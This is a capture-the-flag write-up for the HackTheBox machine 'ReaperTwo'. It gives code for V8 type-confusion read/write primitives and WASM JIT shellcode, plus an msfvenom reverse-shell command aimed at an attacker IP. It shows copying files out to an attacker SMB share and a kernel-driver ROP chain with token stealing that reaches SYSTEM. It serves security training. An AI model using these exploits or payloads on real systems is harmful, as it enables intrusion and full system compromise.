---
title: "ReaperTwo"
date: 2026-09-09 07:00:00 -0500
categories: [HackTheBox, Windows]
tags: [hackthebox, insane, windows, smb, v8, type-confusion, wasm, kernel-exploit, smep-bypass, rop, token-stealing, kASLR]
description: "An IIS web app passes user JavaScript directly to d8.exe (V8 12.2.0); a type-confusion bug in Harmony Set methods yields arbitrary read/write, then WASM JIT shellcode delivers the shell. From there, a vulnerable kernel driver lets you read the LSTAR MSR to defeat kASLR, stack-pivot into a ROP chain that flips a PTE bit to bypass SMEP, and run token-stealing shellcode to land SYSTEM."
---

## Overview

ReaperTwo is an insane-difficulty Windows machine by xct. An IIS-hosted calculator evaluates raw user JavaScript through V8 12.2.0; a [type confusion](https://cwe.mitre.org/data/definitions/843.html) bug in the experimental `Set.prototype.symmetricDifference` method gives full arbitrary read/write over the V8 heap. Shellcode assembled inside a WASM JIT page delivers a reverse shell as `www`. Privilege escalation goes through a custom kernel driver (`Reaper.sys`) that exposes an unvalidated function-pointer call: reading the IA32_LSTAR MSR defeats kASLR, a stack pivot drops into a ROP chain that flips the User/Supervisor PTE bit to bypass SMEP, and a token-stealing shellcode elevates to `NT AUTHORITY\SYSTEM`.

---

## Recon

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.234.76 | grep ^[0-9] | cut -d'/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.129.234.76
```

| Port | Service | Detail |
|---|---|---|
| 80 | HTTP | Microsoft IIS 10.0 — "Reaper2 Calculator" |
| 135 | MSRPC | — |
| 445 | SMB | Windows Server 2022 Build 20348 |
| 3389 | RDP | REAPER2 (certificate `commonName=Reaper2`) |

IIS on 80 runs a JavaScript calculator. SMB is reachable — worth a guest probe before touching the web app.

---

## Enumeration

### SMB — anonymous share access

```bash
nxc smb 10.129.234.76 -u Guest -p '' --shares
```

```
SMB  10.129.234.76  445  REAPER2  Share  Permissions  Remark
SMB  10.129.234.76  445  REAPER2  dev    READ
SMB  10.129.234.76  445  REAPER2  IPC$   READ
```

The `dev` share is world-readable. Browse and download everything:

```bash
impacket-smbclient -no-pass guest@10.129.234.76
# smb: \> cd dev
# smb: \dev\> ls
#   kernel/          (directory)
# smb: \dev\> cd kernel
# smb: \dev\kernel\> get Reaper.sys
# smb: \dev\kernel\> get kernel32.dll
```

`Reaper.sys` is a signed Windows kernel driver — the future privesc vector.

### Web app — V8 version fingerprint

The calculator evaluates raw JavaScript via the V8 engine. Submitting `%dvi8%` (or checking `/info`) reveals **V8 12.2.0** with `--harmony-set-methods` and `--allow-natives-syntax` enabled. That flag set was shipping in a window that includes a published [type confusion](https://cwe.mitre.org/data/definitions/843.html) bug in `Set.prototype.symmetricDifference`.

---

## Foothold — V8 Type Confusion + WASM JIT Shellcode

### The bug ([CWE-843](https://cwe.mitre.org/data/definitions/843.html))

`Set.prototype.symmetricDifference` reads the receiver's `size` property without verifying the receiver's internal V8 map (object shape). When a crafted object is passed as receiver, V8 writes the result back through a stale map pointer — yielding a fake `JSArray` whose `map` and `elements` fields we control.

With `map = 0x18ed71` (PACKED_DOUBLE_ELEMENTS) and a chosen `elements` pointer, that fake array becomes a read/write primitive at any heap address:

```javascript
// Arbitrary address read
function aar(addr) {
    elements = addr - 8n + 1n;
    fake_arr_struct[2] = itof(elements | length << 32n);
    return fake_arr[0];
}

// Arbitrary address write
function aaw(addr, value) {
    elements = addr - 8n + 1n;
    fake_arr_struct[2] = itof(elements | length << 32n);
    fake_arr[0] = itof(value);
}
```

### WASM JIT shellcode (m4cz technique)

V8 compiles `f64.const` immediates byte-for-byte into native JIT code. A WebAssembly module filled with carefully chosen `f64.const` values becomes a region of attacker-controlled bytes sitting in a **RWX JIT page**. The loader shellcode — embedded the same way — scans JIT memory for a 2-byte marker, reassembles 6-byte payload chunks in order, then jumps to the reconstructed shellcode.

Generate the msfvenom payload and build the WASM blob offline:

```bash
msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp \
  LHOST=10.10.16.166 LPORT=443 -f raw -o /tmp/shell.bin
python3 wasm_shell_gen.py   # encodes shell.bin into f64.const WASM entries
```

### Code execution via WASM jump table overwrite

The WASM instance's jump table pointer lives at `wasmInstance_addr + 0x47`. Overwriting it with `jump_table_start + 0x81a` redirects the next `main()` export call into the JIT sled containing the loader, which then executes the msfvenom shellcode:

```javascript
let wasmInstance_addr = addrof(wasmInstance);
let jump_table_start = ftoi(aar(wasmInstance_addr + 0x47n));
aaw(wasmInstance_addr + 0x47n, jump_table_start + 0x81an);
setTimeout(function() { main(); }, 5000);
```

The exploit is submitted via the calculator's POST form (`expressionTextBox` field). After the 5-second setTimeout fires, a reverse shell connects:

```
C:\Windows\system32> whoami
reaper2\www
```

---

## User flag

```bash
type C:\Users\www\Desktop\user.txt
# HTB{...}
```

Initial access as `reaper2\www` confirmed.

---

## Privilege Escalation — Kernel Driver ROP Chain (SMEP/DEP bypass)

### Collect artifacts via SMB server

```bash
# Attacker machine — serve a share
impacket-smbserver -smb2support amra /tmp/share/

# From the www shell:
copy C:\dev\Reaper.sys \\10.10.16.166\amra\Reaper.sys
copy C:\Windows\System32\ntoskrnl.exe \\10.10.16.166\amra\ntoskrnl.exe
```

### Reaper.sys vulnerability — unvalidated function pointer ([CWE-822](https://cwe.mitre.org/data/definitions/822.html))

Reverse engineering `Reaper.sys` in Ghidra reveals that `IRP_MJ_DEVICE_CONTROL` checks `ThreadData.Magic == 0x6a55cc9e` and then calls `ThreadData.Callback` directly — a raw function pointer supplied from user space, executed at kernel privilege. No validation of the pointer's origin or range.

Driver IOCTLs:
| IOCTL | Function |
|---|---|
| `0x8000200B` — `IOCTL_SET_THREAD` | Register thread + store Callback |
| `0x8000200F` — `IOCTL_READ_MSR` | Read an MSR into a caller-supplied buffer |
| `0x80002007` — `IOCTL_BOOST_THREAD` | Fire the stored Callback |

### kASLR bypass — reading IA32_LSTAR

`IOCTL_READ_MSR` with register `0xC0000082` returns the address of `KiSystemCall64`. Its offset from the ntoskrnl base is fixed (found via PDB symbols downloaded with `PDBDownloader.exe ntoskrnl.exe`):

```c
QWORD IA32_LSTAR = msrRead(0xC0000082, hDriver);
QWORD ntBase = IA32_LSTAR - 0x442e00;   // KiSystemCall64 offset from PDB
```

### SMEP bypass — PTE User/Supervisor bit flip

SMEP blocks execution of user-space pages while the CPU is in ring 0. Rather than clearing the SMEP bit in CR4 (which risks a BSOD on restoration), we flip the **User/Supervisor bit** in the shellcode page's PTE to mark it as a kernel page — SMEP never fires against a ring-0-marked page.

The `MiGetPteAddress` function converts a virtual address to its PTE address. Its offset from ntBase is also extracted from the PDB:

```bash
# Offline — with ntoskrnl.exe + symbols loaded in Ghidra:
# MiGetPteAddress offset = 0x3412a4
```

ROP gadgets found with `ropper`:

```bash
ropper -f /mnt/ntoskrnl.exe --search "mov esp"
# 0x0000000140227b40: mov esp, 0x48000000; add esp, 0x28; ret   ← stack pivot
```

### ROP chain + token-stealing shellcode

The exploit (`priv.exe`) cross-compiled with `x86_64-w64-mingw32-gcc`:

1. **Allocate + pin fake kernel stack** at `0x47001000`–`0x4800ffff` via `VirtualAlloc` + `VirtualLock`
2. **Build ROP chain** at `0x48000028`:
   - `pop rcx; ret` — load shellcode address into rcx
   - `MiGetPteAddress` — rax = PTE of shellcode page
   - `pop rcx; ret` — load `0x63` (clears U/S bit)
   - `mov byte [rax], cl; ret` — mark page as kernel
   - `wbinvd; ret` — flush cache to force PTE re-read
   - `<shellcode address>` — execute
3. **Set Callback** = stack pivot gadget (`mov esp, 0x48000000; add esp, 0x28; ret`) via `IOCTL_SET_THREAD`
4. **Fire** with `IOCTL_BOOST_THREAD` — enters kernel, pivots to ROP chain

The token-stealing shellcode traverses `ActiveProcessLinks` starting at the current `EPROCESS` (via `gs:[0x188]`), finds PID 4 (SYSTEM), and copies its `Token` field into the current process. It restores the kernel stack from the saved Trap Frame and returns cleanly via `swapgs; sysretq`.

```bash
# Run via SMB share from the www shell:
\\10.10.16.166\amra\priv.exe

# Output:
# [>] Open handle to Reaper Driver
# [*] IA32_LSTAR: fffff80142ae2e00 (nt!KiSystemCall64)
# [>] Nt base: 0xfffff801426a0000
# [+] VirtualAlloc, allocated address: 0x0000000047001000
# [>] Boosting thread
# [>] Enjoy your shell!

C:\Windows\system32> whoami
nt authority\system
```

---

## Root flag

```bash
type C:\Users\Administrator\Desktop\root.txt
# HTB{...}
```

Full system compromise as `NT AUTHORITY\SYSTEM`.
